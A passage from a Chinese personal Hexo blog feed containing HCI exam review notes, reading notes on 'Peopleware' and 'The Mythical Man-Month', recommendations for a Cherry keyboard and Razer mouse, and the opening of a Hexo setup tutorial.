<li><p>启发式评估（<strong>heuristic evaluation</strong>）</p>
</li>
</ol>
<h4 id="启发式原则"><a href="#启发式原则" class="headerlink" title="启发式原则"></a>启发式原则</h4><ol>
<li>系统状态的可见度</li>
<li>系统和现实世界的吻合</li>
<li>用户享有控制权和自主权</li>
<li>一致性和标准化</li>
<li>避免出错</li>
<li>依赖识别而非记忆</li>
<li>使用的灵活性和高效性：满足不同用户的需要</li>
<li>审美感和最小化设计</li>
<li>帮助用户识别、诊断和恢复错误</li>
<li>帮助和文档</li>
</ol>
<h4 id="层次化任务分析模型（HTA，hierarchical-task-analysis）：示例"><a href="#层次化任务分析模型（HTA，hierarchical-task-analysis）：示例" class="headerlink" title="层次化任务分析模型（HTA，hierarchical task analysis）：示例"></a>层次化任务分析模型（HTA，hierarchical task analysis）：示例</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240105110710120.png" alt="image-20240105110710120" style="zoom:67%;" />



<h4 id="设计：简化交互设计策略"><a href="#设计：简化交互设计策略" class="headerlink" title="设计：简化交互设计策略"></a>设计：简化交互设计策略</h4><ol>
<li>删除：最明显的简化设计方法；</li>
<li>组织：最快捷的简化设计方式；</li>
<li>隐藏：是一种低成本的简化方案；</li>
<li>转移</li>
</ol>
<h4 id="预测模型：GOMS模型"><a href="#预测模型：GOMS模型" class="headerlink" title="预测模型：GOMS模型"></a>预测模型：GOMS模型</h4><ol>
<li><p><strong>Goal-目标</strong>：用户要达到什么目的</p>
</li>
<li><p><strong>Operator-操作</strong>：任务执行的底层行为，不能分解：为达到目标而使用的认知过程和物理行为。如点击鼠标</p>
</li>
<li><p><strong>Method-方法</strong>：如何完成目标的过程，即对应目标的子目标序列和所需操作。如移动鼠标，输入关键字，点击 Go 按钮</p>
</li>
<li><p><strong>Selection-选择规则</strong>：确定当有多种方法时选择和方法。GOMS 认为方法的选择不是随机的</p>
</li>
</ol>
<h4 id="预测模型：KLM-击键层次模型"><a href="#预测模型：KLM-击键层次模型" class="headerlink" title="预测模型：KLM 击键层次模型"></a>预测模型：KLM 击键层次模型</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240105105602924.png" alt="image-20240105105602924" style="zoom:67%;" />

<h4 id="预测模型：Fitts-定律"><a href="#预测模型：Fitts-定律" class="headerlink" title="预测模型：Fitts 定律"></a>预测模型：Fitts 定律</h4><ol>
<li>任意一点移动到目标中心位置所需时间与该点到目标的距离和大小有关，距离越大时间越长，目标越大时间越短<ol>
<li>大目标、小距离具有优势</li>
<li>屏幕元素应该尽可能占据屏幕空间</li>
<li>最好的像素是光标所处的像素</li>
<li>充分利用屏幕边缘的优势</li>
<li>大菜单</li>
</ol>
</li>
</ol>
<h4 id="评估范型和方法"><a href="#评估范型和方法" class="headerlink" title="评估范型和方法"></a>评估范型和方法</h4><ol>
<li><p>快速评估</p>
</li>
<li><p>可用性评估</p>
</li>
<li><p>实地研究</p>
</li>
<li><p>预测性评估</p>
</li>
</ol>
<h4 id="心智模型"><a href="#心智模型" class="headerlink" title="心智模型"></a>心智模型</h4><ol>
<li>心智模式是指深植我们心中关于我们自己、别人、组织及周围世界每个层面的假设、形象和故事。并深受习惯思维、定势思维、已有知识的局限。</li>
</ol>
<h3 id="正确看待“以用户为中心”"><a href="#正确看待“以用户为中心”" class="headerlink" title="正确看待“以用户为中心”"></a>正确看待“以用户为中心”</h3><p>局限性：</p>
<ol>
<li>影响产品的创新性</li>
<li>可操作性受到时间、预算和任务规模的限制</li>
<li>忽视了人的主观能动性和对技术的适应能力</li>
</ol>
]]></content>
      <categories>
        <category>人机交互</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>人机交互</tag>
      </tags>
  </entry>
  <entry>
    <title>《人件》读书笔记</title>
    <url>/2025/02/21/%E4%BA%BA%E4%BB%B6%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<h3 id="一、书名和作者"><a href="#一、书名和作者" class="headerlink" title="一、书名和作者"></a>一、书名和作者</h3><ul>
<li><strong>书名</strong>：《人件》（<em>Peopleware</em>）</li>
<li><strong>作者</strong>：Tom DeMarco、Timothy Lister</li>
</ul>
<h3 id="二、书籍概览"><a href="#二、书籍概览" class="headerlink" title="二、书籍概览"></a>二、书籍概览</h3><ul>
<li><p><strong>主要论点和结构</strong>  </p>
<p>《人件》通过探讨软件工程中的“人”这个核心要素，颠覆了传统关注于技术和流程的工程管理理念。书中提出，人是影响软件开发成功与否的关键因素，而非仅仅是生产工具，必须重视人的需求和工作环境的优化。德马科和李斯特基于大量的真实案例和数据，论证了创造良好工作环境的重要性，以及如何通过有效的管理方法实现团队生产力的提升。全书分为若干主题，包括工作场所设计、激励、团队管理等，旨在帮助管理者提升团队的协作效率。</p>
</li>
<li><p><strong>目标读者和应用场景</strong>  </p>
<p>这本书适合软件工程管理领域的从业者、项目经理，以及希望提升团队管理能力的技术人员。它尤其适用于希望在实践中运用人性化管理方法的人员，以改善团队氛围，增强生产力。</p>
</li>
</ul>
<span id="more"></span>

<h3 id="三、核心观点与主题总结"><a href="#三、核心观点与主题总结" class="headerlink" title="三、核心观点与主题总结"></a>三、核心观点与主题总结</h3><p>书中核心观点围绕着“人”这一要素展开，作者强调人是决定项目成败的关键，并且提出了若干提升工作效率和员工满意度的关键点。</p>
<ol>
<li><p><strong>工作环境的影响</strong>  </p>
<p>作者主张物理环境和心理环境是影响生产力的重要因素，远超过很多管理者的意识。传统管理忽视了员工的工作环境设计，使得“开放式办公”成为许多公司追求“高效”的象征，但实际上，噪音和干扰大大削弱了团队的工作效率。通过案例分析，作者指出团队的独立工作空间和“隔离时间”可以显著提升成员的专注力和创新性。</p>
</li>
<li><p><strong>激励与生产力的关系</strong>  </p>
<p>激励不是简单的物质奖励。高效的激励不是通过短期的奖金和物质奖励，而是来自工作内容的丰富性、挑战感，以及成员之间的信任和合作。通过调动员工的内在驱动力，项目团队的整体凝聚力和成效会更显著。</p>
</li>
<li><p><strong>团队中的协作与文化</strong>  </p>
<p>作者强调团队协作对项目成功的重要性，且真正的协作需要建立在成员间的信任和文化认同上。这种文化并非通过单一规则或绩效考核就能实现，而需要营造一个开放、包容的氛围，帮助成员之间形成有效的沟通，并且彼此支持。</p>
</li>
<li><p><strong>对“管理者”的重新定义</strong>  </p>
<p>作者认为，优秀的管理者不是任务的分配者，而是团队的“支持者”。他们的核心工作是去除障碍、提供资源，并尽量减少无意义的流程，以便团队能够高效工作。书中建议，管理者在任何团队会议或讨论中，不应该直接干预具体方案的制定，而是鼓励团队成员自主解决问题。</p>
</li>
<li><p><strong>项目管理的“防御性编程”</strong>  </p>
<p>项目管理的另一面在于应对失败和不可控因素。作者提出了“防御性编程”概念，鼓励团队预见可能的风险点并设置应对方案，而不是单纯追求进度或单调的效率指标。强调项目中的容错机制和应变策略，才能真正提高项目的长期效能。</p>
</li>
</ol>
<p>这些观点一改软件工程管理领域传统的流程和指标导向，更关注实际开发环境下，如何通过人性化管理实现长期生产力的提升。在整个工程管理中，技术固然重要，但“人”的因素却是不可忽视的底层逻辑。</p>
<h3 id="四、批评与局限性"><a href="#四、批评与局限性" class="headerlink" title="四、批评与局限性"></a>四、批评与局限性</h3><ol>
<li><p><strong>理论的理想化</strong>  </p>
<p>虽然作者的观点充满了理想主义色彩，但在实际应用中，许多公司可能并无能力去彻底优化员工环境。例如，为员工提供独立空间或减少打扰虽有利于工作效率，但在现实中实施这些措施常面临场地和成本的限制。特别是对于初创公司或成本严格受控的企业，书中一些“理想型”建议难以落地，缺乏考虑企业的实际财务和资源约束。</p>
</li>
<li><p><strong>对人性和团队动态的过度强调</strong>  </p>
<p>书中对于团队成员的人性和工作状态关注度极高，但可能忽视了工程管理中的流程规范、项目制度等技术性因素。例如，很多工程失败的原因是技术管理的缺陷或进度安排不当，若单纯寄希望于“优化人性化管理”来提高项目成功率，可能会忽视实际工作中对规范的需求。</p>
</li>
<li><p><strong>缺少技术与人文的平衡</strong>  </p>
<p>本书侧重人文管理，淡化了技术规范的重要性，这在软件工程中可能并不完全适用。对于许多具有高技术要求的项目而言，开发中的代码规范、质量审查等流程无法因“人性”而简化。这种偏重人文、淡化技术的倾向可能会对读者产生误导，特别是对新手项目经理而言，过于人性化的管理可能影响工程质量和进度。</p>
</li>
<li><p><strong>难以衡量的软性标准</strong>  </p>
<p>书中提到的生产力和效率提高并没有严格的量化标准，尤其是在“员工幸福感”或“团队氛围”这类软性标准上较为模糊。虽然这类因素在工作效率中发挥重要作用，但由于缺乏可衡量的标准，往往无法被用作评估项目成功的具体指标。对于试图通过量化分析进行项目管理的团队来说，书中的观点缺乏足够的操作性指导。</p>
</li>
</ol>
<h3 id="五、自己的感悟和思考"><a href="#五、自己的感悟和思考" class="headerlink" title="五、自己的感悟和思考"></a>五、自己的感悟和思考</h3><p>​	阅读这本书让我对管理方式有了一些新的思考。以往我对项目管理的理解更多关注进度控制和任务分配，然而书中不断强调的人性化管理提醒我，团队成员的心理状态和协作氛围对项目成效的影响不可忽视。</p>
<p>​	在日常项目中，常遇到因沟通不畅或环境干扰而效率下降的情况。过去，我通常会加快进度或增加监控频率，但这本书让我意识到，问题的根源或许在于团队氛围欠佳或缺乏空间支持。因此，我会尝试在未来的管理中引入“隔离时间”概念，鼓励团队成员在某些时段集中处理重要任务，减少外部干扰。</p>
<p>​	此外，我也重新思考了激励的方式。传统的物质激励虽然短期内有效，但很难持续。未来的激励策略中可以加入更多团队建设活动，尤其是提升团队信任度和合作意愿的项目，从根本上提升团队的凝聚力。</p>
<h3 id="六、总结与评价"><a href="#六、总结与评价" class="headerlink" title="六、总结与评价"></a>六、总结与评价</h3><p>​	总体来说，《人件》作为软件工程管理的经典著作，提供了对管理方法的全新视角，强调人性化管理在团队工作中的重要性。虽然部分观点在实际落地中会受到环境和成本限制，但其中很多对“人”的重视、对管理的反思无疑为软件项目管理注入了更多人性关怀。对于未来的管理者来说，理解并运用书中的人文思想，会是提升团队生产力的有效途径之一。</p>
]]></content>
      <categories>
        <category>软件工程管理</category>
      </categories>
      <tags>
        <tag>软件工程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>《人月神话》读书笔记</title>
    <url>/2025/02/21/%E4%BA%BA%E6%9C%88%E7%A5%9E%E8%AF%9D%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<h3 id="一、书名和作者"><a href="#一、书名和作者" class="headerlink" title="一、书名和作者"></a>一、书名和作者</h3><ul>
<li><strong>书名</strong>：《人月神话》（<em>The Mythical Man-Month</em>）</li>
<li><strong>作者</strong>：弗雷德里克·布鲁克斯（Frederick P. Brooks）</li>
</ul>
<h3 id="二、书籍概览"><a href="#二、书籍概览" class="headerlink" title="二、书籍概览"></a>二、书籍概览</h3><ul>
<li><strong>主要论点和结构</strong><br>该书是一本关于软件工程和项目管理的经典著作，围绕“人月”的概念展开，解释了为什么增加人员不能按比例缩短项目时间。布鲁克斯通过多年的管理经验，提出了影响项目开发成功的核心因素，如沟通、团队管理、项目规划等。全书由多个章节组成，涵盖了软件开发的方方面面，包括项目延迟的根本原因和有效的管理策略。</li>
<li><strong>目标读者和应用场景</strong><br>该书适合软件工程师、项目经理以及对软件开发过程有兴趣的人员。其理论可用于大型软件项目的管理，尤其适合管理复杂的团队协作和解决项目延期问题。</li>
</ul>
<span id="more"></span>

<h3 id="三、核心观点与主题"><a href="#三、核心观点与主题" class="headerlink" title="三、核心观点与主题"></a>三、核心观点与主题</h3><h4 id="1-主题一：人月不可互换"><a href="#1-主题一：人月不可互换" class="headerlink" title="1. 主题一：人月不可互换"></a>1. 主题一：人月不可互换</h4><ul>
<li><strong>子观点1</strong>：增加人员会增加沟通成本<br>布鲁克斯认为，增加人员无法直接缩短项目开发时间，反而会因为新成员的加入需要额外的沟通和协调，导致项目进度更加滞后。每个新成员都需要熟悉项目，并与其他团队成员同步，这增加了团队之间的沟通复杂性。</li>
<li><strong>子观点2</strong>：人月是个谬论<br>布鲁克斯用“人月”概念揭示了一个误区：人月不可分解和互换。一项工作如果需要4个人完成1个月的时间，并不意味着8个人可以在半个月内完成，因为每个任务中的依赖性会阻碍进度。</li>
<li><strong>实例</strong>：IBM OS&#x2F;360 项目<br>布鲁克斯在IBM领导OS&#x2F;360操作系统开发时发现，随着项目人员的增加，项目延期反而更加严重。这一真实的项目管理经验直接促使他提出了“布鲁克斯法则”——增加人手只会让进度更慢。</li>
</ul>
<h4 id="2-主题二：概念完整性"><a href="#2-主题二：概念完整性" class="headerlink" title="2. 主题二：概念完整性"></a>2. 主题二：概念完整性</h4><ul>
<li><strong>子观点1</strong>：系统的设计应有少数设计者领导<br>布鲁克斯认为，软件系统的架构设计应由少数经验丰富的设计者完成，而不是让整个团队共同决定。这确保了系统的概念完整性和一致性，避免了设计上的混乱。</li>
<li><strong>子观点2</strong>：过多的设计者会影响系统一致性<br>布鲁克斯认为，过多的设计者可能导致系统功能多样、架构松散，不同部分的实现方式各异，影响了软件整体的可维护性和可扩展性。因此，保持少数核心设计者主导能够确保系统的清晰性。</li>
<li>**实例：外科手术队伍模型<br>布鲁克斯提出“外科手术队伍模型”，其中主设计者（“主刀医生”）负责系统架构和关键决策，其他人作为助手支持。这种方法有助于减少设计中的意见分歧，保证系统的一致性。</li>
</ul>
<h4 id="3-主题三：原型的重要性"><a href="#3-主题三：原型的重要性" class="headerlink" title="3. 主题三：原型的重要性"></a>3. 主题三：原型的重要性</h4><ul>
<li><strong>子观点1</strong>：尽早开发原型以验证需求<br>布鲁克斯建议在项目初期尽早开发“扔掉型”原型，通过早期的实际操作来验证系统的需求和设计，从而避免后期的大规模返工。这种方法可以迅速暴露系统中潜在的问题。</li>
<li><strong>子观点2</strong>：迭代开发优于瀑布式开发<br>传统的瀑布式开发模型强调从需求到设计的线性过程，而布鲁克斯更推崇迭代开发，通过不断调整原型，使得团队能够灵活应对需求变化。</li>
<li><strong>实例</strong>：微软的Windows开发模式<br>微软在开发Windows时采用了类似的方法，通过早期的原型不断迭代，验证了系统设计和功能需求。这种方法帮助团队在开发过程中不断调整，避免了发布时的大规模返工。</li>
</ul>
<h3 id="四、亮点与启发"><a href="#四、亮点与启发" class="headerlink" title="四、亮点与启发"></a>四、亮点与启发</h3><ul>
<li><strong>最有影响的观点或实例</strong><br>“布鲁克斯法则”是全书中最具影响力的观点，揭示了项目管理中一个常见误区：增加人员无法解决项目延迟问题，反而可能让项目更加落后。通过这一观点，布鲁克斯为我们提供了一个重要的项目管理启示：合理规划和分配资源比单纯增加人力更为有效。</li>
<li><strong>对个人或专业发展的启示</strong><br>《人月神话》对个人管理和职业发展也有很大启发。它提醒我们在工作中应注重沟通和协作，避免盲目扩展团队规模。同时，它还强调了早期计划和原型的重要性，帮助我们更好地应对复杂的项目环境。</li>
</ul>
<h3 id="五、批评与局限性"><a href="#五、批评与局限性" class="headerlink" title="五、批评与局限性"></a>五、批评与局限性</h3><ul>
<li><strong>任何有争议、模糊或过时的信息</strong><br>尽管《人月神话》在软件开发和项目管理方面具有开创性的观点，但其中一些理念在当今的软件开发环境中可能显得过时。例如，布鲁克斯提出的传统瀑布式开发模型已经被敏捷开发等更灵活的模型取代。随着技术的进步，项目管理工具的普及和自动化的实现也使得沟通成本得以大幅降低。</li>
<li><strong>可能的不足或缺陷</strong><br>布鲁克斯的观点大多基于大型企业项目，对于小型团队或初创企业的开发环境，书中的一些管理方法可能不具备普适性。此外，书中提到的很多经验是基于上世纪的开发工具和流程，未能反映当前技术和团队合作的最新发展。</li>
</ul>
<h3 id="六、实际应用和拓展"><a href="#六、实际应用和拓展" class="headerlink" title="六、实际应用和拓展"></a>六、实际应用和拓展</h3><ul>
<li><strong>在实际工作&#x2F;学习中如何应用这些概念</strong><br>在实际工作中，《人月神话》中的许多理念依然适用，如团队管理、沟通和协调的重要性。特别是在项目规划中，我们可以更加重视合理分配任务和人员，而不是通过增加人手来解决问题。此外，书中对沟通和系统设计一致性的强调，在管理复杂项目时尤为关键。</li>
<li><strong>对未来研究或实践的建议</strong><br>未来的研究可以结合现代开发模式（如敏捷和DevOps），探索如何在新的工作环境下进一步优化项目管理。将布鲁克斯的经典理念与当代的自动化工具和持续交付模式结合，可能会为软件开发提供更多启发。</li>
</ul>
<h3 id="七、总结与评价"><a href="#七、总结与评价" class="headerlink" title="七、总结与评价"></a>七、总结与评价</h3><ul>
<li><strong>对书籍的整体评价</strong><br>《人月神话》是一本充满洞见的经典著作，深刻揭示了软件开发中的管理问题。虽然部分观点随着时代发展有所局限，但书中的许多观点，如“布鲁克斯法则”和“概念完整性”等，即使在今天的开发环境中依然适用，尤其是在处理复杂项目时，它为我们提供了宝贵的经验和教训。</li>
<li><strong>书籍的长处和短处</strong><br>书籍的长处在于布鲁克斯通过自身丰富的实践经验，总结出了一系列具有前瞻性的项目管理理念，短处则在于某些观点已经不完全适应当今的开发环境。但总体来说，它依然是一本值得反复阅读的经典。</li>
</ul>
]]></content>
      <categories>
        <category>软件工程管理</category>
      </categories>
      <tags>
        <tag>软件工程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>外设推荐——Cherry MX2.0S</title>
    <url>/2024/12/15/%E5%A4%96%E8%AE%BE%E6%8E%A8%E8%8D%90%E2%80%94%E2%80%94Cherry%20MX2.0S/</url>
    <content><![CDATA[<h1 id="🎮-外设推荐-——-樱桃Cherry-MX2-0S-白色-有线-🍒"><a href="#🎮-外设推荐-——-樱桃Cherry-MX2-0S-白色-有线-🍒" class="headerlink" title="🎮 外设推荐 —— 樱桃Cherry MX2.0S 白色 有线 🍒"></a>🎮 外设推荐 —— <strong>樱桃Cherry MX2.0S 白色 有线</strong> 🍒</h1><div style="display: flex; align-items: center; margin-bottom: 20px;">
    <div style="flex: 1; padding-right: 20px;">
        <h2>🌟 写在前面</h2>
        <p>
            本系列是我推荐的一些 <strong>个人喜爱的外设</strong>，全凭主观感受，没有任何专业性，仅供参考！
        </p>
        <p>
            如果你和我一样追求高颜值和高性能，那一定不要错过这个系列！
        </p>
        <p>
            今天推荐的产品，是我在 2021 年 10 月买的一款键盘——CHERRY MX2.0S 机械键盘。
            这张键盘陪了我也有三年了，一直是我的主力键盘，可以说是颜值无敌，声音无敌，手感无敌。
        </p>
    </div>
    <div style="flex: 0 0 400px;">
        <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/221326jpvvgjvjf10p0282.jpg" 
             alt="Cherry Mx2.0S键盘" 
             style=" width: 100%; max-width: 400px;">
    </div>
</div>

<span id="more"></span>

<h2 id="🖱️-产品参数一览"><a href="#🖱️-产品参数一览" class="headerlink" title="🖱️ 产品参数一览"></a>🖱️ 产品参数一览</h2><table>
<thead>
<tr>
<th><strong>属性</strong></th>
<th><strong>详细信息</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>全名</strong></td>
<td>Cherry MX2.0S</td>
</tr>
<tr>
<td><strong>按键冲突</strong></td>
<td>全键无冲</td>
</tr>
<tr>
<td><strong>键帽材质</strong></td>
<td>ABS</td>
</tr>
<tr>
<td><strong>按键布局</strong></td>
<td>109键</td>
</tr>
<tr>
<td><strong>轴体</strong></td>
<td>MX 红轴&#x2F;茶轴&#x2F;青轴&#x2F;黑轴</td>
</tr>
<tr>
<td><strong>连接方式</strong></td>
<td>有线</td>
</tr>
<tr>
<td><strong>灯光</strong></td>
<td>无光</td>
</tr>
<tr>
<td><strong>京东自营价</strong></td>
<td>¥349</td>
</tr>
</tbody></table>
<hr>
<h2 id="🔑-我喜欢的理由"><a href="#🔑-我喜欢的理由" class="headerlink" title="🔑 我喜欢的理由"></a>🔑 <strong>我喜欢的理由</strong></h2><ol>
<li><p><strong>⚪ 纯白设计，简约耐看</strong>  </p>
<ul>
<li>低调又百搭，适合任何办公或家庭环境。</li>
</ul>
</li>
<li><p><strong>⌨️ 全尺寸布局，细节到位</strong>  </p>
<ul>
<li>109键设计，兼顾功能和舒适性，特别适合办公场景。  </li>
<li>配备脚撑，轻松调整键盘高度，满足不同需求。</li>
</ul>
</li>
<li><p><strong>🛡️ 优质材质，温暖手感</strong>  </p>
<ul>
<li>使用高品质塑料外壳，触感温润，不像铝合金材质冬天会冻手。</li>
</ul>
</li>
<li><p><strong>🔧 樱桃机械轴，手感经典</strong>  </p>
<ul>
<li>原厂 Cherry 机械轴，采用黄金十字触点技术，保证手感稳定，寿命超长。</li>
</ul>
</li>
<li><p><strong>🔋 更多款式</strong>  </p>
<ul>
<li><p>无线版支持三模切换（有线、蓝牙、2.4G），配备 Type-C 接口充电，并带有背部的无线接收器收纳槽，方便又实用。</p>
</li>
<li><p>喜欢灯光效果？MX 2.0S 还提供 RGB 背光款式，炫彩夺目，点亮桌面！</p>
</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>小提示</strong>：可能为了续航考虑，目前 MX 2.0S 暂未推出同时包含无线和 RGB 的版本。</p>
</blockquote>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/221325hb3hkohiffib4omb.jpg" alt="221325hb3hkohiffib4omb" style="zoom:67%;" />

<hr>
<h2 id="⭐-推荐指数"><a href="#⭐-推荐指数" class="headerlink" title="⭐ 推荐指数"></a>⭐ 推荐指数</h2><div style="text-align: center; font-size: 1.5rem;">
    🌟 🌟 🌟 🌟 🌟
</div>


<hr>
<h3 id="📢-总结"><a href="#📢-总结" class="headerlink" title="📢 总结"></a>📢 <strong>总结</strong></h3><p>作为 Cherry 的经典力作，<strong>MX 2.0S</strong> 将简约设计、优质手感与强大功能完美结合，无论是办公还是日常使用，它都能提供出色的体验。如果你在寻找一款兼具颜值、实用性与性价比的机械键盘，MX 2.0S 绝对是值得入手的选择！ 🎉</p>
<p>官网链接：</p>
<p>​	有线款：<a href="https://item.jd.com/100022342135.html"><a href="https://item.jd.com/100012642639.html#crumb-wrap">【CHERRYMX2.0S】CHERRY樱桃 MX2.0S 机械键盘 游戏键盘 办公键盘 电脑键盘 全尺寸键盘 有线键盘 樱桃无钢结构 白色红轴【行情 报价 价格 评测】-京东</a></a></p>
<p>​	无线款：<a href="https://item.jd.com/100038511684.html">【CHERRYMX2.0S】CHERRY樱桃 MX2.0S 机械键盘 无线键盘 三模电竞 游戏键盘 办公电脑键盘 樱桃无钢结构 白色黑轴【行情 报价 价格 评测】-京东</a></p>
<hr>
<blockquote>
<p><strong>✨ 如果你喜欢这篇推荐，欢迎点赞收藏！期待你的分享和讨论！</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>外设推荐</category>
      </categories>
      <tags>
        <tag>外设</tag>
      </tags>
  </entry>
  <entry>
    <title>外设推荐——雷蛇毒蝰 V2 Pro</title>
    <url>/2024/12/14/%E5%A4%96%E8%AE%BE%E6%8E%A8%E8%8D%90%E2%80%94%E2%80%94%E9%9B%B7%E8%9B%87%E6%AF%92%E8%9D%B0v2pro/</url>
    <content><![CDATA[<h1 id="🎮-外设推荐-——-雷蛇毒蝰-V2-Pro-🐍"><a href="#🎮-外设推荐-——-雷蛇毒蝰-V2-Pro-🐍" class="headerlink" title="🎮 外设推荐 —— 雷蛇毒蝰 V2 Pro 🐍"></a>🎮 外设推荐 —— <strong>雷蛇毒蝰 V2 Pro</strong> 🐍</h1><div style="display: flex; align-items: center; margin-bottom: 20px;">
    <div style="flex: 1; padding-right: 20px;">
        <h2>🌟 写在前面</h2>
        <p>
            本系列是我推荐的一些 <strong>个人喜爱的外设</strong>，全凭主观感受，没有任何专业性，仅供参考！
        </p>
        <p>
            如果你和我一样追求高颜值和高性能，那一定不要错过这个系列！
        </p>
        <p>
            今天推荐的产品，是我在 2024 年年初入手的雷蛇旗舰系列鼠标——<strong>雷蛇毒蝰 V2 Pro</strong>。
            它真的是一款让我 <strong>爱不释手</strong> 的外设：360 度无死角，性能和设计兼具，虽价格略高，但绝对值得！
        </p>
    </div>
    <div style="flex: 0 0 200px;">
        <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241214111904834.png" 
             alt="雷蛇毒蝰 V2 Pro 鼠标" 
             style="box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); width: 100%; max-width: 200px;">
    </div>
</div>

<span id="more"></span>

<h2 id="🖱️-产品参数一览"><a href="#🖱️-产品参数一览" class="headerlink" title="🖱️ 产品参数一览"></a>🖱️ 产品参数一览</h2><table>
<thead>
<tr>
<th><strong>属性</strong></th>
<th><strong>详细信息</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>全名</strong></td>
<td>雷蛇毒蝰 V2 专业版（Viper V2 Pro）</td>
</tr>
<tr>
<td><strong>重量</strong></td>
<td>58g</td>
</tr>
<tr>
<td><strong>灵敏度</strong></td>
<td>30000 DPI</td>
</tr>
<tr>
<td><strong>轮询率</strong></td>
<td>1000Hz &#x2F; 8000Hz</td>
</tr>
<tr>
<td><strong>连接方式</strong></td>
<td>有线 &#x2F; 2.4G 无线连接</td>
</tr>
<tr>
<td><strong>充电方式</strong></td>
<td>有线充电</td>
</tr>
<tr>
<td><strong>京东自营最低价</strong></td>
<td>¥549</td>
</tr>
</tbody></table>
<hr>
<h2 id="🏆-我喜欢的理由"><a href="#🏆-我喜欢的理由" class="headerlink" title="🏆 我喜欢的理由"></a>🏆 <strong>我喜欢的理由</strong></h2><ol>
<li><strong>🌟 超高颜值</strong> <ul>
<li>正面线条硬朗，我称之它为“<strong>钢铁侠的面具</strong>”，科技感拉满！</li>
</ul>
</li>
<li><strong>💨 轻如鸿毛</strong> <ul>
<li>重量仅 58g，握在手里非常轻盈，长时间使用也毫无负担。</li>
</ul>
</li>
<li><strong>🔋 续航出色</strong> <ul>
<li>每周充一次电即可，适合频繁使用的玩家。</li>
</ul>
</li>
<li><strong>🔗 高品质配件</strong> <ul>
<li>附带编织绳充电线（Type-C 接口），不易损坏且便于携带。 </li>
<li>附赠防滑贴，让鼠标颜值和实用性更进一步！ </li>
<li>附赠无限接收器和精美“太空舱”，方便存放且不易丢失。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="⭐-推荐指数"><a href="#⭐-推荐指数" class="headerlink" title="⭐ 推荐指数"></a>⭐ 推荐指数</h2><div style="text-align: center; font-size: 1.5rem;">
    🌟 🌟 🌟 🌟 🌟
</div>

<hr>
<h3 id="📢-总结"><a href="#📢-总结" class="headerlink" title="📢 总结"></a>📢 <strong>总结</strong></h3><p>作为雷蛇的旗舰产品，<strong>毒蝰 V2 Pro</strong> 集轻量化、颜值和性能于一体，适合那些追求高端外设的玩家。如果你愿意为更好的游戏体验付出一些预算，那么这款鼠标绝对不会让你失望！ 🎉 </p>
<p>官网链接：<a href="https://item.jd.com/100022342135.html">【雷蛇毒蝰V2专业版】雷蛇（Razer）毒蝰V2pro专业版无线鼠标 电竞游戏 轻量化 对称型 白色(附专用防滑贴+Type-C充电接口)【行情 报价 价格 评测】-京东</a></p>
<hr>
<blockquote>
<p><strong>✨ 如果你喜欢这篇推荐，欢迎点赞收藏！期待你的分享和讨论！</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>外设推荐</category>
      </categories>
      <tags>
        <tag>外设</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（一）—— Hexo</title>
    <url>/2024/12/12/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94Hexo/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>本篇文章主要讲搭建个人网页的第一步，包括安装hexo、掌握hexo的基本指令，以及如何使用hexo写博客。</p>
<p>前面还有<strong>零</strong>，建议阅读那一篇后再开始本篇。</p>
<h3 id="一-安装Hexo"><a href="#一-安装Hexo" class="headerlink" title="一 安装Hexo"></a>一 安装Hexo</h3><blockquote>
<p>Hexo 是一个基于 Node.js 的快速、简洁且强大的静态博客框架，专为博客创作者设计。它支持使用 Markdown 撰写文章，生成静态文件，并通过简单的命令快速部署到各种平台（如 GitHub Pages、GitLab Pages 等）。Hexo 拥有丰富的插件和主题生态，用户可以轻松扩展功能或切换风格，同时生成速度极快，非常适合追求高效与可定制性的个人博客搭建者。</p>
</blockquote>
<p>首先，创建一个空文件夹，取个名字，例如pentabin，接下来我们的命令和代码都在这里面。</p>
<p>然后在该文件夹中打开命令行，使用npm命令安装Hexo，输入：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure>

<p>安装完成后初始化博客：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">init</span> blog</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>接下来进入blog，输入以下命令进行测试：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">cd blog</span><br><span class="line">hexo <span class="keyword">new</span> <span class="built_in">a_test</span></span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>这时应该可以看到命令行中出现了：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212195447801.png" alt="image-20241212195447801"></p>
<p>此时到浏览器中输入<a href="http://localhost:4000/%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E7%BD%91%E9%A1%B5%E4%BA%86%E3%80%82">http://localhost:4000/，应该就能看到网页了。</a></p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212195736518.png" alt="image-20241212195736518" style="zoom:50%;" />

